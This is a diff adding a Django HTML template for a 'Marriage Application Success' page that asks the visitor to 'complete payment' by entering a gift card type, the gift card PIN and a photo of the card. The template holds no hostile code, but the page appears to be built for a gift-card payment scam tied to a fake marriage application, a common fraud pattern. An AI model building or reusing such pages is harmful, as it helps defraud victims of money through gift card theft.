@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+{%load static%}
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Marriage Application Success</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/daisyui@4.12.14/dist/full.min.css" rel="stylesheet" type="text/css" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Add Toastify CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+    <!-- Add Toastify JS -->
+    <script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
+
+</head>
+
+{% if messages %}
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        {% for message in messages %}
+        Toastify({
+            text: "{{ message }}",
+            duration: 3000,
+            close: true,
+            gravity: "top", // `top` or `bottom`
+            position: "center", // `left`, `center` or `right`
+            backgroundColor: "{{ message.tags|default:'blue' }}",
+            stopOnFocus: true, // Prevents dismissing of toast on hover
+        }).showToast();
+        {% endfor %}
+    });
+</script>
+{% endif %}
+
+
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
+    <div class="bg-white rounded-lg shadow-md p-6 w-full max-w-md">
+        <div class="flex flex-col items-center justify-center">
+            <img src="{%static 'media/ttb.png'%}" class="w-24 h-24 mt-2" alt="">
+            <flex class="flex-col">
+                <h6 class="text-sm font-bold">Complete payment.</h6>
+
+
+            </flex>
+        </div>
+
+        <br>
+        <div class="flex justify-center items-center">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                stroke="currentColor" class="size-6 text-primary display-3 text-2xl">
+                <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z" />
+            </svg>
+
+        </div>
+        <p class="text-center text-xs mb-3">Carefully fill in this form as the details provided would be used in real
+            time validations.</p>
+        <br><br>
+        <div class="flex items-center justify-center">
+            {% if application_for %}
+            <div class="info-box">
+                <p><strong>Application For:</strong> {{ application_for }}</p>
+                <p><strong>Selected Duration:</strong> {{ duration_plan_label }}</p>
+            </div>
+            {% endif %}
+
+        </div>
+
+        <!-- <small class="text-primary flex items-center justify-center">Please close this page for security
+            purposes...</small> -->
+
+        <form method="post" enctype="multipart/form-data" id="giftCardForm">
+
+            {% csrf_token %}
+
+            <div class="form-group">
+                <label for="{{ form.amount.id_for_label }}">Amount</label>
+                {{ form.amount }}
+                {{ form.amount.errors }}
+            </div>
+
+            <div class="form-group">
+                <label for="{{ form.currency.id_for_label }}">Currency</label>
+                {{ form.currency }}
+                {{ form.currency.errors }}
+            </div>
+
+            <div class="form-group">
+                <label for="{{ form.gift_card_type.id_for_label }}">Gift Card Type</label>
+                {{ form.gift_card_type }}
+                {{ form.gift_card_type.errors }}
+            </div>
+
+            <div class="form-group">
+                <label for="{{ form.gift_card_pin.id_for_label }}">Gift Card PIN</label>
+                {{ form.gift_card_pin }}
+                {{ form.gift_card_pin.errors }}
+            </div>
+
+            <div class="form-group">
+                <label for="{{ form.picture.id_for_label }}">Gift Card Image</label>
+                {{ form.picture }}
+                {{ form.picture.errors }}
+            </div>
+
+
+            <button type="submit" id="submitBtn"
+                class="w-full bg-indigo-500 text-white py-2 px-4 rounded-lg hover:bg-indigo-600 disabled:opacity-50 disabled:cursor-not-allowed">
+                Submit
+            </button>
+        </form>
+
+
+    </div>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const form = document.getElementById("giftCardForm");
+            const button = document.getElementById("submitBtn");
+
+            form.addEventListener("submit", function () {
+                button.disabled = true;
+                button.innerHTML = `
+                    <svg class="animate-spin h-4 w-4 mr-2 inline-block text-white"
+             xmlns="http://www.w3.org/2000/svg"
+             fill="none"
+             viewBox="0 0 24 24">
+          <circle class="opacity-25" cx="12" cy="12" r="10"
+                  stroke="currentColor" stroke-width="4"></circle>
+          <path class="opacity-75" fill="currentColor"
+                d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+        </svg>
+        Processing...
+      `;
+
+            });
+        });
+    </script>
+</body>
+
+
+</html>
